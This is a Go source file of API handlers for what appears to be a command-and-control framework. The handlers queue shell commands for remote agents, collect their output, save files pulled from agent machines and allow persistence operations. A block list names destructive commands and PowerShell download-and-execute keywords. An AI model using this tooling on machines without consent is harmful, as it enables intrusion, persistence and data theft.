package api

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/server/services"
	"github.com/mjopsec/taburtuaiC2/shared/types"
)

// ExecuteCommand queues a command for execution with enhanced validation
func (h *Handlers) ExecuteCommand(c *gin.Context) {
	var req struct {
		AgentID    string            `json:"agent_id" binding:"required"`
		Command    string            `json:"command" binding:"required"`
		Args       []string          `json:"args,omitempty"`
		WorkingDir string            `json:"working_dir,omitempty"`
		Timeout    int               `json:"timeout,omitempty"`
		Metadata   map[string]string `json:"metadata,omitempty"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request format: %v", err))
		return
	}

	// Validate agent ID format
	if !isValidUUID(req.AgentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	// Validate command length and content
	if len(req.Command) == 0 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Command cannot be empty")
		return
	}

	if len(req.Command) > 10000 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Command too long (max 10000 characters)")
		return
	}

	// Sanitize and validate command
	if containsDangerousPatterns(req.Command) {
		h.server.Logger.Warn(services.AUDIT,
			fmt.Sprintf("Potentially dangerous command blocked: %s", req.Command),
			req.AgentID, "", map[string]string{
				"client_ip":  c.ClientIP(),
				"user_agent": c.GetHeader("User-Agent"),
			})
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Command contains potentially dangerous patterns")
		return
	}

	// Verify agent exists and is online
	agent, exists := h.server.Monitor.GetAgent(req.AgentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s, cannot execute commands", agent.Status))
		return
	}

	// Validate and sanitize timeout
	if req.Timeout < 0 || req.Timeout > 3600 {
		req.Timeout = 300 // Default 5 minutes, max 1 hour
	}

	// Validate working directory
	if req.WorkingDir != "" {
		if err := validateFilePath(req.WorkingDir); err != nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid working directory: %v", err))
			return
		}
	}

	// Create command with enhanced validation
	cmd := &types.Command{
		ID:            generateSecureUUID(),
		AgentID:       req.AgentID,
		Command:       sanitizeCommand(req.Command),
		OperationType: "execute",
		Args:          sanitizeArgs(req.Args),
		WorkingDir:    sanitizeWorkingDir(req.WorkingDir),
		Timeout:       req.Timeout,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Metadata:      sanitizeMetadata(req.Metadata),
	}

	if cmd.Timeout == 0 {
		cmd.Timeout = 300
	}

	// Validate command before adding to queue
	if err := validateCommand(cmd); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Command validation failed: %v", err))
		return
	}

	// Add to queue with error handling
	h.server.CommandQueue.Add(req.AgentID, cmd)
	h.server.Logger.LogCommandExecution(req.AgentID, req.Command, "Queued", true)

	data := map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
		"timeout":    cmd.Timeout,
		"created_at": cmd.CreatedAt.Format(time.RFC3339),
	}

	h.APIResponse(c, true, "Command queued successfully", data, "")
}

// GetNextCommand returns next command for agent
func (h *Handlers) GetNextCommand(c *gin.Context) {
	agentID := c.Param("id")

	// Validate agent ID format
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	// Verify agent
	if _, exists := h.server.Monitor.GetAgent(agentID); !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	// Get next command
	cmd := h.server.CommandQueue.GetNext(agentID)
	if cmd == nil {
		c.Status(http.StatusNoContent)
		return
	}

	// Log the command being sent for debugging
	h.server.Logger.Debug(services.COMMAND_EXEC,
		fmt.Sprintf("Sending command to agent: ID=%s, Cmd=%s, Type=%s", cmd.ID, cmd.Command, cmd.OperationType),
		agentID, cmd.Command, map[string]string{
			"command_id":     cmd.ID,
			"operation_type": cmd.OperationType,
		})

	// Encrypt if crypto available
	var responseData interface{} = cmd
	if h.server.CryptoMgr != nil {
		cmdJSON, err := json.Marshal(cmd)
		if err == nil {
			if encrypted, err := h.server.CryptoMgr.EncryptData(cmdJSON); err == nil {
				responseData = map[string]string{"encrypted": encrypted}
				h.server.Logger.Debug(services.COMMAND_EXEC, "Command encrypted for transmission", agentID, "", nil)
			} else {
				h.server.Logger.Warn(services.COMMAND_EXEC, "Failed to encrypt command, sending plain", agentID, "", nil)
			}
		}
	}

	// Use simple response format without nested structure for command endpoint
	response := types.APIResponse{
		Success: true,
		Data:    responseData,
	}

	c.JSON(http.StatusOK, response)
}

// SubmitCommandResult processes command execution result
func (h *Handlers) SubmitCommandResult(c *gin.Context) {
	body, err := c.GetRawData()
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Failed to read request body")
		return
	}

	// Check for encrypted payload
	var encryptedCheck struct {
		EncryptedPayload string `json:"encrypted_payload"`
	}

	if err := json.Unmarshal(body, &encryptedCheck); err == nil && encryptedCheck.EncryptedPayload != "" {
		if h.server.CryptoMgr != nil {
			decrypted, err := h.server.CryptoMgr.DecryptData(encryptedCheck.EncryptedPayload)
			if err != nil {
				h.server.Logger.Error(services.COMMAND_EXEC, "Failed to decrypt command result", "", "", map[string]string{
					"error": err.Error(),
				})
				c.Status(http.StatusBadRequest)
				h.APIResponse(c, false, "", nil, "Failed to decrypt payload")
				return
			}
			body = decrypted
		}
	}

	var result types.CommandResult
	if err := json.Unmarshal(body, &result); err != nil {
		h.server.Logger.Error(services.COMMAND_EXEC, "Failed to parse command result", "", "", map[string]string{
			"error": err.Error(),
			"body":  string(body),
		})
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid result format")
		return
	}

	// Log received result for debugging
	h.server.Logger.Debug(services.COMMAND_EXEC,
		fmt.Sprintf("Received command result: ID=%s, ExitCode=%d", result.CommandID, result.ExitCode),
		"", "", map[string]string{
			"command_id": result.CommandID,
			"exit_code":  fmt.Sprintf("%d", result.ExitCode),
		})

	// Validate command ID format
	if !isValidUUID(result.CommandID) {
		h.server.Logger.Error(services.COMMAND_EXEC, "Invalid command ID format in result", "", "", map[string]string{
			"command_id": result.CommandID,
		})
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid command ID format")
		return
	}

	// Decrypt result fields if needed
	if result.Encrypted && h.server.CryptoMgr != nil {
		if result.Output != "" {
			if decrypted, err := h.server.CryptoMgr.DecryptData(result.Output); err == nil {
				result.Output = string(decrypted)
			}
		}
		if result.Error != "" {
			if decrypted, err := h.server.CryptoMgr.DecryptData(result.Error); err == nil {
				result.Error = string(decrypted)
			}
		}
	}

	// Complete command
	cmd, err := h.server.CommandQueue.CompleteCommand(result.CommandID, &result)
	if err != nil || cmd == nil {
		h.server.Logger.Error(services.COMMAND_EXEC, "Command not found for result", "", "", map[string]string{
			"command_id": result.CommandID,
			"error":      fmt.Sprintf("%v", err),
		})
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Command not found")
		return
	}

	// Handle download file saving BEFORE logging
	if cmd.OperationType == "download" && cmd.Status == "completed" {
		if cmd.DestinationPath != "" {
			// Validate destination path before writing
			if err := validateFilePath(cmd.DestinationPath); err != nil {
				cmd.Error = fmt.Sprintf("Invalid destination path: %v", err)
				cmd.Status = "failed"
			} else {
				// Create directory if it doesn't exist
				dir := filepath.Dir(cmd.DestinationPath)
				if dir != "." && dir != "" {
					err := os.MkdirAll(dir, 0755)
					if err != nil {
						h.server.Logger.Error(services.SYSTEM,
							fmt.Sprintf("Failed to create directory for download: %v", err),
							cmd.AgentID, "", nil)
					}
				}

				// Save the file with size limit check
				if len(result.Output) > 100*1024*1024 { // 100MB limit
					cmd.Error = "Downloaded file too large (max 100MB)"
					cmd.Status = "failed"
				} else {
					err = os.WriteFile(cmd.DestinationPath, []byte(result.Output), 0644)
					if err != nil {
						cmd.Error = fmt.Sprintf("Server failed to save file: %v", err)
						cmd.Status = "failed"
						h.server.Logger.Error(services.SYSTEM,
							fmt.Sprintf("Failed to save downloaded file to %s: %v", cmd.DestinationPath, err),
							cmd.AgentID, "", nil)
					} else {
						fileSize := len(result.Output)
						// Update output message to indicate success
						cmd.Output = fmt.Sprintf("File successfully downloaded and saved to %s (%d bytes)",
							cmd.DestinationPath, fileSize)
						h.server.Logger.Info(services.SYSTEM,
							fmt.Sprintf("File downloaded and saved to %s", cmd.DestinationPath),
							cmd.AgentID, "", nil)
					}
				}
			}
		} else {
			h.server.Logger.Warn(services.SYSTEM,
				"Download completed but no destination path specified",
				cmd.AgentID, "", nil)
		}
	}

	// Log result (after file handling so we log the updated output)
	success := cmd.Status == "completed"
	h.server.Logger.LogCommandExecution(cmd.AgentID, cmd.Command, cmd.Output, success)

	// Record metrics
	duration := cmd.CompletedAt.Sub(cmd.ExecutedAt)
	h.server.Monitor.RecordCommand(cmd.AgentID, cmd.Command, success, duration)

	// Use simple response format
	response := map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
		"duration":   duration.String(),
	}

	h.APIResponse(c, true, "Command result processed", response, "")
}

// GetCommandStatus returns command status
func (h *Handlers) GetCommandStatus(c *gin.Context) {
	commandID := c.Param("id")

	// Validate command ID format
	if !isValidUUID(commandID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid command ID format")
		return
	}

	cmd := h.server.CommandQueue.GetCommand(commandID)
	if cmd == nil {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Command not found")
		return
	}

	// Calculate duration if command has started
	var duration time.Duration
	if !cmd.ExecutedAt.IsZero() {
		if cmd.Status == "completed" || cmd.Status == "failed" || cmd.Status == "timeout" {
			duration = cmd.CompletedAt.Sub(cmd.ExecutedAt)
		} else {
			duration = time.Since(cmd.ExecutedAt)
		}
	}

	// Create clean copy and build response data
	cmdResponse := map[string]interface{}{
		"id":             cmd.ID,
		"agent_id":       cmd.AgentID,
		"command":        cmd.Command,
		"status":         cmd.Status,
		"operation_type": cmd.OperationType,
		"created_at":     cmd.CreatedAt.Format(time.RFC3339),
		"timeout":        cmd.Timeout,
	}

	// Add execution timing if available
	if !cmd.ExecutedAt.IsZero() {
		cmdResponse["executed_at"] = cmd.ExecutedAt.Format(time.RFC3339)
		cmdResponse["duration_seconds"] = duration.Seconds()
	}

	if !cmd.CompletedAt.IsZero() {
		cmdResponse["completed_at"] = cmd.CompletedAt.Format(time.RFC3339)
	}

	// Add results if command is completed
	if cmd.Status == "completed" || cmd.Status == "failed" || cmd.Status == "timeout" {
		cmdResponse["exit_code"] = cmd.ExitCode

		// Handle large outputs for file operations
		if cmd.OperationType == "upload" || (cmd.OperationType == "download" && len(cmd.Output) > 1024) {
			if len(cmd.Output) > 1024 {
				cmdResponse["output"] = fmt.Sprintf("[File content too large, size: %d bytes]", len(cmd.Output))
			} else {
				cmdResponse["output"] = cmd.Output
			}
		} else {
			cmdResponse["output"] = cmd.Output
		}

		cmdResponse["error"] = cmd.Error
	}

	// Add working directory if specified
	if cmd.WorkingDir != "" {
		cmdResponse["working_dir"] = cmd.WorkingDir
	}

	// Add metadata if available
	if cmd.Metadata != nil && len(cmd.Metadata) > 0 {
		cmdResponse["metadata"] = cmd.Metadata
	}

	// IMPORTANT: Use direct response without nested structure
	h.APIResponse(c, true, "", cmdResponse, "")
}

// GetAgentCommands returns command history for an agent
func (h *Handlers) GetAgentCommands(c *gin.Context) {
	agentID := c.Param("id")
	status := c.Query("status")
	limit := 50

	// Validate agent ID format
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	// Validate limit parameter
	if l, err := strconv.Atoi(c.Query("limit")); err == nil && l > 0 {
		if l > 1000 { // Max 1000 commands
			limit = 1000
		} else {
			limit = l
		}
	}

	commands := h.server.CommandQueue.GetAgentCommands(agentID, status, limit)

	// Clean up large outputs
	var cleanCommands []*types.Command
	for _, cmd := range commands {
		cmdCopy := *cmd
		cmdCopy.FileContent = nil
		if len(cmdCopy.Output) > 256 {
			cmdCopy.Output = cmdCopy.Output[:253] + "..."
		}
		if len(cmdCopy.Error) > 256 {
			cmdCopy.Error = cmdCopy.Error[:253] + "..."
		}
		cleanCommands = append(cleanCommands, &cmdCopy)
	}

	h.APIResponse(c, true, "", map[string]interface{}{
		"commands": cleanCommands,
		"count":    len(cleanCommands),
	}, "")
}

// ClearAgentQueue clears pending commands for an agent
func (h *Handlers) ClearAgentQueue(c *gin.Context) {
	agentID := c.Param("id")

	// Validate agent ID format
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	count := h.server.CommandQueue.ClearQueue(agentID)

	message := fmt.Sprintf("Cleared %d pending commands for agent %s", count, agentID)
	h.server.Logger.Info("AUDIT", message, agentID, "", nil)

	h.APIResponse(c, true, message, map[string]interface{}{
		"cleared_count": count,
		"agent_id":      agentID,
	}, "")
}

// ========================================
// SECURITY HELPER FUNCTIONS
// ========================================

// isValidUUID validates UUID format
func isValidUUID(uuid string) bool {
	if uuid == "" {
		return false
	}

	// UUID regex pattern: 8-4-4-4-12 hexadecimal digits
	r := regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
	return r.MatchString(strings.ToLower(uuid))
}

// containsDangerousPatterns checks for potentially dangerous command patterns
func containsDangerousPatterns(command string) bool {
	dangerousPatterns := []string{
		"rm -rf /", "rm -rf /*", "del /s /q", "format c:", "shutdown", "reboot",
		"dd if=/dev/zero", ":(){ :|:& };:", "mkfs", "fdisk", "parted",
		"sudo rm", "sudo dd", "sudo mkfs", "chmod 777 /", "chown root /",
	}

	cmdLower := strings.ToLower(strings.TrimSpace(command))
	for _, pattern := range dangerousPatterns {
		if strings.Contains(cmdLower, pattern) {
			return true
		}
	}

	// Check for suspicious PowerShell commands
	suspiciousPowerShell := []string{
		"invoke-expression", "iex", "downloadstring", "system.net.webclient",
		"reflection.assembly", "bypass", "encodedcommand", "-enc",
	}

	for _, pattern := range suspiciousPowerShell {
		if strings.Contains(cmdLower, pattern) {
			return true
		}
	}

	return false
}

// sanitizeCommand removes dangerous characters from command
func sanitizeCommand(command string) string {
	// Remove null bytes and control characters
	command = strings.ReplaceAll(command, "\x00", "")
	command = strings.ReplaceAll(command, "\r", "")

	// Remove leading/trailing whitespace
	command = strings.TrimSpace(command)

	return command
}

// sanitizeArgs sanitizes command arguments
func sanitizeArgs(args []string) []string {
	sanitized := make([]string, 0, len(args))
	for _, arg := range args {
		if arg != "" {
			cleaned := sanitizeCommand(arg)
			if len(cleaned) <= 1000 { // Reasonable limit per argument
				sanitized = append(sanitized, cleaned)
			}
		}
	}
	return sanitized
}

// sanitizeWorkingDir sanitizes working directory path
func sanitizeWorkingDir(workDir string) string {
	if workDir == "" {
		return ""
	}

	// Clean the path
	workDir = filepath.Clean(workDir)

	// Basic path traversal protection
	if strings.Contains(workDir, "..") {
		return "" // Reject paths with traversal attempts
	}

	// Remove null bytes
	workDir = strings.ReplaceAll(workDir, "\x00", "")

	return workDir
}

// sanitizeMetadata sanitizes metadata key-value pairs
func sanitizeMetadata(metadata map[string]string) map[string]string {
	if metadata == nil {
		return make(map[string]string)
	}

	sanitized := make(map[string]string)
	for k, v := range metadata {
		if len(k) <= 100 && len(v) <= 1000 { // Reasonable limits
			cleanKey := sanitizeCommand(k)
			cleanValue := sanitizeCommand(v)
			if cleanKey != "" {
				sanitized[cleanKey] = cleanValue
			}
		}
	}
	return sanitized
}

// generateSecureUUID generates a cryptographically secure UUID
func generateSecureUUID() string {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		// Fallback to standard UUID if crypto/rand fails
		return uuid.New().String()
	}

	b[6] = (b[6] & 0x0f) | 0x40 // Version 4
	b[8] = (b[8] & 0x3f) | 0x80 // Variant 10

	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// validateCommand validates command structure and content
func validateCommand(cmd *types.Command) error {
	if cmd == nil {
		return fmt.Errorf("command cannot be nil")
	}

	if cmd.Command == "" {
		return fmt.Errorf("command text cannot be empty")
	}

	if len(cmd.Command) > 10000 {
		return fmt.Errorf("command too long (max 10000 characters)")
	}

	if cmd.Timeout < 0 || cmd.Timeout > 3600 {
		return fmt.Errorf("invalid timeout value (must be 0-3600 seconds)")
	}

	// Validate operation type
	validOperations := map[string]bool{
		"execute": true, "upload": true, "download": true,
		"process_list": true, "process_kill": true, "process_start": true,
		"persist_setup": true, "persist_remove": true,
	}

	if cmd.OperationType != "" && !validOperations[cmd.OperationType] {
		return fmt.Errorf("invalid operation type: %s", cmd.OperationType)
	}

	return nil
}

// validateFilePath validates file paths for security
func validateFilePath(path string) error {
	if path == "" {
		return fmt.Errorf("file path cannot be empty")
	}

	if len(path) > 1000 {
		return fmt.Errorf("file path too long (max 1000 characters)")
	}

	// Check for path traversal attempts
	if strings.Contains(path, "..") {
		return fmt.Errorf("path traversal not allowed")
	}

	// Check for null bytes
	if strings.Contains(path, "\x00") {
		return fmt.Errorf("null bytes not allowed in path")
	}

	// Platform-specific validation
	if runtime.GOOS == "windows" {
		// Check for Windows-specific invalid characters
		invalidChars := []string{"<", ">", ":", "\"", "|", "?", "*"}
		for _, char := range invalidChars {
			if strings.Contains(path, char) {
				return fmt.Errorf("invalid character '%s' in Windows path", char)
			}
		}
	}

	return nil
}
